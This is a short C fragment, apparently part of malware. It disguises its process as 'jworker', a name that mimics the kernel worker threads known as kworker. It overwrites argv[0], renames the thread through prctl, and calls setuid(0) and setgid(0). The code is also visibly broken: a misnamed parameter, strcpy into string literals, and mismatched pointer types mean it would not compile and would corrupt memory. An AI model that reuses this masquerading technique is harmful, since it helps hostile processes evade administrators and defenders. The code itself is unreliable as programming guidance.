void disguise(char ** agv)
{
	char* disguise = "";
	strcpy(disguise, getDisguise());
	setDisguise(disguise, argv[1]);
}

char* getDisguise()
{
	char* disguise = "";
	// not yet implemented!!
	strcpy(disguise, "jworker");
	return disguise;
}

void setDisguise(char * disguise, char * argv)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv, disguise);
	prctl(PR_SET_NAME, disguise, 0, 0);

	setuid(0);
	setgid(0);
}